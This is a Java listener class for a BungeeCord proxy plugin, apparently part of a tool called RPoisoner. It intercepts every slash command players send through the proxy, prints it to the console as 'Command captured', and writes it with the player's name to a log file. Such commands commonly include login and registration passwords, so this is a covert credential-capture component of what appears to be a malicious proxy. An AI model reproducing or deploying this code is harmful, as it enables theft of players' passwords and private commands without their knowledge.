package com.wrrulos.rpoisoner.listeners;

import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

public class ChatListener implements Listener {

    @EventHandler
    public void onChat(ChatEvent event) throws IOException {

        String message = event.getMessage();

        if (message.startsWith("/")) {
            ProxiedPlayer player = (ProxiedPlayer)event.getSender();
            FileWriter f = new FileWriter("plugins/RPoisoner/commands.txt");
            System.out.println("[!] Command captured (" + player + ") -> " + message);
            f.write("(" + player + ") -> " + message + "\n");
            f.close();
        }
    }
}
